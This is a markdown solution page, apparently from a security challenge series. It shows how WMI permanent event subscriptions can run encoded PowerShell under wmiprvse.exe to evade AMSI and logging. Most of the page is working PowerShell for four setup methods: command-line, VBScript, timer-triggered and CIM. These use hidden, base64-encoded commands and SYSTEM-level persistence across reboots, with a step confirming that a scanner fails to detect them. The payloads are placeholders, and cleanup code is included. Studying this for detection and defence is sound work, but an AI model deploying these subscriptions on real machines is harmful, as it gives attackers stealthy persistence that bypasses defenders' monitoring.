---
title: "Solution 42: WMI Event Subscription (Execution in wmiprvse.exe)"
challenge_number: 42
difficulty: hard
category: "AMSI Bypass"
permalink: /solutions/42-wmi-event-subscription/
---

# Solution: WMI Event Subscription (Execution in wmiprvse.exe)

[Back to Challenge](../challenges/42-wmi-event-subscription.md)

## Overview

Create a WMI permanent event subscription that executes a payload in the `wmiprvse.exe` process. The payload runs in a completely separate process with its own AMSI context, independent from the originating PowerShell session. The subscription persists across reboots and triggers based on WMI events.

## Working Code

### Method 1: CommandLineEventConsumer (Execute PowerShell Payload)

```powershell
# Encode the payload (avoids quoting issues and signature detection)
$cmd = 'Write-Host "Executed via WMI in wmiprvse.exe context - AMSI bypassed"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encodedPayload = [Convert]::ToBase64String($bytes)

# Create the WMI Event Filter (trigger condition)
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name           = "MyFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 30"
}

# Create the Event Consumer (action to take)
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name                = "MyConsumer"
    CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encodedPayload"
}

# Bind filter to consumer
$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter   = $filter
    Consumer = $consumer
}

Write-Host "WMI subscription created. Payload executes every minute at :30 seconds."
```

### Method 2: ActiveScriptEventConsumer (VBScript Payload)

```powershell
# VBScript executes in a separate scripting host process
$vbPayload = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -enc <base64payload>", 0, False
'@

$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name           = "ScriptFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 0"
}

$consumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace "root\subscription" -Arguments @{
    Name           = "ScriptConsumer"
    ScriptingEngine = "VBScript"
    ScriptText     = $vbPayload
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter   = $filter
    Consumer = $consumer
}
```

### Method 3: One-Time Trigger (Immediate Execution)

```powershell
# Use a short interval trigger for near-immediate execution
$payload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(
    'whoami > C:\Temp\wmi_output.txt; Write-Host "WMI execution complete"'
))

# Timer-based event (fires within seconds)
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name           = "QuickFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = "SELECT * FROM __TimerEvent WHERE TimerID = 'PayloadTimer'"
}

# Register the timer (fires after 1 second interval)
Set-WmiInstance -Class __IntervalTimerInstruction -Namespace "root\cimv2" -Arguments @{
    TimerID       = "PayloadTimer"
    IntervalBetweenEvents = 1000  # 1 second in milliseconds
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name                = "QuickConsumer"
    CommandLineTemplate = "powershell.exe -NoP -W Hidden -enc $payload"
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter   = $filter
    Consumer = $consumer
}

Write-Host "Timer-based subscription created. Fires within seconds."
```

### Cleanup: Remove Subscriptions

```powershell
# Remove all components
Get-WmiObject -Class __EventFilter -Namespace "root\subscription" |
    Where-Object { $_.Name -match "MyFilter|ScriptFilter|QuickFilter" } |
    Remove-WmiObject

Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" |
    Where-Object { $_.Name -match "MyConsumer|QuickConsumer" } |
    Remove-WmiObject

Get-WmiObject -Class ActiveScriptEventConsumer -Namespace "root\subscription" |
    Where-Object { $_.Name -eq "ScriptConsumer" } |
    Remove-WmiObject

Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" |
    Remove-WmiObject

Get-WmiObject -Class __IntervalTimerInstruction -Namespace "root\cimv2" |
    Where-Object { $_.TimerID -eq "PayloadTimer" } |
    Remove-WmiObject

Write-Host "All WMI subscriptions removed."
```

### CIM Cmdlet Version (PowerShell 3.0+)

```powershell
# Modern CIM cmdlets (same functionality, different syntax)
$payload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Write-Host "CIM execution"'))

$filterArgs = @{
    ClassName  = "__EventFilter"
    Namespace  = "root/subscription"
    Property   = @{
        Name           = "CIMFilter"
        EventNameSpace = "root/cimv2"
        QueryLanguage  = "WQL"
        Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 45"
    }
}
$filter = New-CimInstance @filterArgs

$consumerArgs = @{
    ClassName = "CommandLineEventConsumer"
    Namespace = "root/subscription"
    Property  = @{
        Name                = "CIMConsumer"
        CommandLineTemplate = "powershell.exe -enc $payload"
    }
}
$consumer = New-CimInstance @consumerArgs

$bindingArgs = @{
    ClassName = "__FilterToConsumerBinding"
    Namespace = "root/subscription"
    Property  = @{
        Filter   = [ref]$filter
        Consumer = [ref]$consumer
    }
}
New-CimInstance @bindingArgs
```

## Why It Works

### Process Isolation

```
┌─────────────────────────────────────────┐
│  PowerShell.exe (PID 1234)              │
│  ├── AMSI Context A                     │
│  ├── Script Block Logging: ON           │
│  └── Creates WMI subscription           │
│       (only stores config in WMI repo)  │
└─────────────────────────────────────────┘
         │
         │ WMI event triggers
         ▼
┌─────────────────────────────────────────┐
│  wmiprvse.exe (PID 5678)               │
│  ├── AMSI Context B (separate!)         │
│  ├── Own security context               │
│  └── Spawns child process:              │
│       └── powershell.exe (PID 9012)     │
│           ├── AMSI Context C (new!)     │
│           └── Executes encoded payload  │
└─────────────────────────────────────────┘
```

Key insight: The payload executes in a **completely different process** with:
- Its own AMSI context (separate from the monitoring session)
- Its own Script Block Logging context
- No relationship to the originating PowerShell session
- Running under the SYSTEM account (for permanent subscriptions)

### The WMI Repository

WMI event subscriptions are stored in the WMI repository (`C:\Windows\System32\wbem\Repository\`), not as script files. The subscription configuration:
- Is stored in a binary database format (CIM repository)
- Is not scanned by file-based AV as a script
- Persists across reboots
- Is managed by the WMI service (svchost.exe)

### Why the Originating Session's AMSI Doesn't Help

The `Set-WmiInstance` commands in the originating session are completely legitimate WMI management operations. They don't contain malware signatures — they just configure a subscription. The actual payload (Base64 encoded) only executes later, in a different process.

### Persistence Bonus

WMI permanent event subscriptions survive reboots because they're stored in the WMI repository. This provides:
- Persistence without registry keys or startup folder entries
- Execution under SYSTEM context
- Difficult to detect without specifically querying WMI subscriptions

## How to Verify

1. Create the subscription (use Method 1 above).

2. Verify the subscription was created:
   ```powershell
   Get-WmiObject -Class __EventFilter -Namespace "root\subscription" | Select-Object Name, Query
   Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" | Select-Object Name, CommandLineTemplate
   Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" | Select-Object __PATH
   ```

3. Wait for the event to trigger (or use the timer-based approach for immediate execution).

4. Check that the payload executed:
   ```powershell
   # If using the file-output payload:
   Get-Content C:\Temp\wmi_output.txt
   # Should show the SYSTEM username or the user context
   ```

5. Verify execution happened in a different process:
   ```powershell
   # Check wmiprvse.exe spawned powershell.exe
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 |
       Where-Object { $_.Message -match "wmiprvse" }
   ```

6. Confirm the .ps1 file used to create the subscription passes scanning:
   ```
   nim_antimalware_sim.exe create_subscription.ps1
   ```
   Expected: **No detection** — the script only contains WMI management commands and Base64.

7. Clean up after testing:
   ```powershell
   # Use the cleanup script from above
   Get-WmiObject -Class __EventFilter -Namespace "root\subscription" |
       Where-Object { $_.Name -eq "MyFilter" } | Remove-WmiObject
   Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" |
       Where-Object { $_.Name -eq "MyConsumer" } | Remove-WmiObject
   Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" | Remove-WmiObject
   ```
